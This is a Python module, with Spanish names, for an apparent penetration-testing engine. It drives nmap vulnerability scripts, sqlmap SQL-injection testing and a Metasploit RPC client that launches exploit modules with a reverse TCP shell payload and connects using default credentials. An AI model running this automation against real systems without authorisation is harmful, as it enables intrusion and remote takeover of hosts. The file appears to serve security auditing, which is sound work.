from __future__ import annotations

import logging
import shutil
import subprocess
from dataclasses import dataclass, field

from rich.console import Console
from rich.panel import Panel

log = logging.getLogger(__name__)


@dataclass
class AuditResult:
    fase: str
    target: str
    stdout: str = ""
    stderr: str = ""
    returncode: int = -1
    error: str = ""

    @property
    def exitoso(self) -> bool:
        return self.returncode == 0 and not self.error


class AuditEngine:

    TIMEOUT_NMAP: int = 300
    TIMEOUT_SQLMAP: int = 600
    TIMEOUT_DEFAULT: int = 60

    HERRAMIENTAS_REQUERIDAS: list[str] = ["nmap", "sqlmap"]

    def __init__(self, main_app):
        self.main_app = main_app
        self.console: Console = main_app.console
        self._verificar_dependencias()

    # Verificación de herramientas al inicio

    def _verificar_dependencias(self) -> None:
        faltantes = [
            h for h in self.HERRAMIENTAS_REQUERIDAS if shutil.which(h) is None]
        if faltantes:
            self.console.print(
                f"[bold red][!] Herramientas no encontradas en PATH: "
                f"{', '.join(faltantes)}[/bold red]"
            )
            log.warning("Dependencias faltantes: %s", faltantes)

    # Utilidad interna para ejecutar subprocesos

    def _ejecutar(
        self,
        cmd: list[str],
        timeout: int,
        fase: str,
        target: str,
    ) -> AuditResult:
        resultado = AuditResult(fase=fase, target=target)
        log.info("[%s] Comando: %s", fase, " ".join(cmd))

        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            resultado.stdout = proc.stdout
            resultado.stderr = proc.stderr
            resultado.returncode = proc.returncode

            if proc.returncode != 0:
                log.warning(
                    "[%s] Salida con código %d: %s",
                    fase, proc.returncode, proc.stderr[:200],
                )

        except subprocess.TimeoutExpired:
            resultado.error = f"Timeout ({timeout}s) alcanzado."
            log.error("[%s] Timeout en: %s", fase, target)

        except FileNotFoundError:
            resultado.error = f"Herramienta no encontrada: {cmd[0]}"
            log.error("[%s] %s no está instalado.", fase, cmd[0])

        except OSError as e:
            resultado.error = str(e)
            log.exception("[%s] Error de sistema.", fase)

        return resultado

    # FASE 3: Detección de vulnerabilidades (Nmap NSE)

    def escaneo_vulnerabilidades(
        self,
        target: str,
        scripts: str = "vuln",
        puertos: str | None = None,
    ) -> AuditResult:
        self.main_app.animar_barra(
            f"[Fase 3] Buscando vulnerabilidades en {target}...")

        cmd = ["nmap", "-sV", "--script", scripts, target]
        if puertos:
            cmd += ["-p", puertos]

        return self._ejecutar(cmd, self.TIMEOUT_NMAP, "Nmap-NSE", target)

    # FASE 4: Auditoría SQL (SQLmap)

    def auditoria_sql(
        self,
        url: str,
        nivel: int = 1,
        riesgo: int = 1,
        extra_args: list[str] | None = None,
    ) -> AuditResult:
        self.main_app.animar_barra(
            f"[Fase 4] Analizando inyección SQL en {url}...")

        cmd = [
            "sqlmap", "-u", url,
            "--batch",
            "--banner",
            f"--level={nivel}",
            f"--risk={riesgo}",
        ]
        if extra_args:
            cmd.extend(extra_args)

        return self._ejecutar(cmd, self.TIMEOUT_SQLMAP, "SQLmap", url)

    # FASE 5: Control de exploits (Metasploit RPC)

    def conectar_metasploit(
        self,
        host: str = "127.0.0.1",
        port: int = 55553,
        user: str = "msf",
        password: str = "msf",
    ) -> bool:
        self.console.print(
            "[bold yellow][*] Conectando con Metasploit RPC Daemon...[/bold yellow]"
        )

        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            self.msf_client = MsfRpcClient(
                password, server=host, port=port, username=user, ssl=True
            )
            version = self.msf_client.core.version
            self.console.print(Panel(
                f"[green]Metasploit conectado[/green]\n"
                f"Versión: {version['version']}  |  "
                f"API: {version['api_version']}",
                title="[bold green]MSF RPC[/bold green]",
            ))
            log.info("Metasploit RPC conectado: %s", version)
            return True

        except ImportError:
            self.console.print(
                "[red][!] pymetasploit3 no instalado. "
                "Ejecuta: pip install pymetasploit3[/red]"
            )
        except OSError as e:
            self.console.print(
                f"[bold red][!] Error al conectar con MSF RPC: {e}[/bold red]"
            )
            log.error("MSF RPC error: %s", e)

        return False

    def ejecutar_modulo_msf(self, modulo: str, opciones: dict) -> dict | None:
        if not hasattr(self, "msf_client"):
            self.console.print(
                "[red][!] Primero debes conectar con Metasploit (conectar_metasploit).[/red]"
            )
            return None

        try:
            exploit = self.msf_client.modules.use("exploit", modulo)
            for k, v in opciones.items():
                exploit[k] = v
            resultado = exploit.execute(payload="generic/shell_reverse_tcp")
            log.info("Módulo MSF ejecutado: %s → %s", modulo, resultado)
            return resultado
        except OSError as e:
            log.error("Error ejecutando módulo MSF %s: %s", modulo, e)
            self.console.print(f"[red][!] Error en módulo MSF: {e}[/red]")
            return None
